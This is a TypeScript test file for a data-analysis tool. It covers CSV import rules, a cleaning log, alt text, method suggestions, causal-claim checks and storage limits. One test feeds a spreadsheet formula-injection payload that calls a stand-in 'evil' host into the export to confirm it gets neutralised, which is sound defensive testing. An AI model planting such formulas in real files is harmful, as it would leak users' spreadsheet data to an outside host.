import { describe, expect, it } from 'vitest';
import { addTransform, altText, clean, DATA_BUDGET, describeColumn, fits, importCsv, MAX_RAW, toCsv, interpretationGaps, methodsFor, methodsWriteUp, readDataProjects, type DataProject } from './data';

const now = new Date('2026-09-27T12:00:00Z');

const CSV = 'id,group,score\n1,a,10\n2,a,12\n3,b,\n3,b,\n4,b,9\n';

const project = (): DataProject => {
  const r = importCsv('d1', 'Survey', CSV, 'T2', now);
  if (!r.ok) throw new Error(r.reason);
  return r.project;
};

describe('data studio', () => {
  it('refuses to import regulated or restricted data, and unclassified data', () => {
    expect(importCsv('d', 'x', CSV, 'T4', now).ok).toBe(false);
    expect(importCsv('d', 'x', CSV, 'T5', now).ok).toBe(false);
    expect(importCsv('d', 'x', CSV, undefined, now).ok).toBe(false);
  });

  it('suggests a dictionary but leaves it unconfirmed', () => {
    const p = project();
    expect(p.dictionary.find((c) => c.name === 'score')?.type).toBe('number');
    expect(p.dictionary.every((c) => !c.confirmed)).toBe(true);
  });

  it('never changes the raw data; cleaning is the log replayed', () => {
    let p = project();
    const add = (t: Parameters<typeof addTransform>[1]) => {
      const r = addTransform(p, t);
      if (!r.ok) throw new Error(r.reason);
      p = r.project;
    };
    add({ id: 't1', kind: 'drop-duplicates', column: '', from: '', to: '', note: 'Row 3 was exported twice.' });
    add({ id: 't2', kind: 'drop-missing', column: 'score', from: '', to: '', note: 'No score recorded.' });
    expect(p.raw).toBe(CSV);
    expect(clean(p).rows.length).toBe(3);
    expect(clean({ ...p, transforms: p.transforms.slice(0, 1) }).rows.length).toBe(4);
    expect(methodsWriteUp(p)).toContain('5 rows as imported; 3 after cleaning');
  });

  it('refuses a cleaning step with no reason', () => {
    expect(addTransform(project(), { id: 't', kind: 'drop-missing', column: 'score', from: '', to: '', note: ' ' }).ok).toBe(false);
  });

  it('writes alt text from the computed numbers', () => {
    const d = describeColumn(clean(project()), 'score')!;
    expect(altText(d)).toMatch(/3 values \(2 missing\)/);
    expect(altText(d)).toMatch(/median/);
  });

  it('always offers more than one method, each with its assumptions', () => {
    for (const outcome of ['number', 'category'] as const)
      for (const comparison of ['one-group', 'two-groups', 'three-plus-groups', 'relationship'] as const)
        for (const paired of [false, true]) {
          const m = methodsFor(outcome, comparison, paired);
          expect(m.length).toBeGreaterThan(1);
          for (const x of m) expect(x.assumptions.length).toBeGreaterThan(0);
        }
  });

  it('will not accept an interpretation without uncertainty and limits', () => {
    const p = project();
    const gaps = interpretationGaps({ ...p, interpretation: { shows: 'a', method: 'b', uncertainty: '', conclude: 'c', cannotConclude: '' } });
    expect(gaps.join(' ')).toMatch(/uncertainty/);
    expect(gaps.join(' ')).toMatch(/cannot show/);
  });

  it('flags a causal conclusion from non-randomized data', () => {
    const p = { ...project(), interpretation: { shows: 'a', method: 'b', uncertainty: 'c', conclude: 'Group b causes lower scores', cannotConclude: 'd' } };
    expect(interpretationGaps(p).join(' ')).toMatch(/causal/);
    expect(interpretationGaps({ ...p, randomized: true }).join(' ')).not.toMatch(/causal/);
  });

  it('refuses stored data claiming a regulated tier', () => {
    expect(() => readDataProjects([{ ...project(), tier: 'T4' }])).toThrow();
  });

  it('neutralises formula cells in the CSV export and quotes what needs quoting', () => {
    const csv = toCsv({ headers: ['name', '=cmd'], rows: [['Ada', '=HYPERLINK("http://evil/?"&A2,"x")'], ['Bob', '+SUM(1;2)'], ['Cy', '@x'], ['Di', '-2'], ['Ed', '\tx'], ['Fa', 'a\rb'], ['Gi', 'plain']] });
    const lines = csv.split('\n');
    expect(lines[0]).toBe("name,'=cmd");
    expect(lines[1]).toBe(`Ada,"'=HYPERLINK(""http://evil/?""&A2,""x"")"`);
    expect(lines[2]).toBe("Bob,'+SUM(1;2)");
    expect(lines[3]).toBe("Cy,'@x");
    expect(lines[4]).toBe("Di,'-2");
    expect(lines[5]).toBe("Ed,'\tx");
    expect(csv).toContain(`Fa,"a\rb"`);
    expect(lines.at(-1)).toBe('Gi,plain');
  });

  it('keeps the library inside its storage budget', () => {
    expect(importCsv('d', 'x', 'a\n' + '1\n'.repeat(MAX_RAW), 'T2', now).ok).toBe(false);
    const quoted = importCsv('d', 'x', 'a\n' + '"q",\n'.repeat(Math.floor((MAX_RAW - 2) / 5)), 'T2', now);
    if (!quoted.ok) throw new Error(quoted.reason);
    expect(fits([quoted.project])).toBe(true);
    expect(fits([quoted.project, { ...quoted.project, id: 'e' }, { ...quoted.project, id: 'f' }])).toBe(false);
    expect(JSON.stringify([quoted.project]).length).toBeLessThanOrEqual(DATA_BUDGET);
  });

  it('flags causal wording in the descriptive result as well as the conclusion', () => {
    const p = { ...project(), interpretation: { shows: 'Group b causes lower scores', method: 'b', uncertainty: 'c', conclude: 'Group b scores lower on average', cannotConclude: 'd' } };
    expect(interpretationGaps(p).join(' ')).toMatch(/What the data shows/);
    expect(interpretationGaps({ ...p, randomized: true }).join(' ')).not.toMatch(/What the data shows/);
  });
});
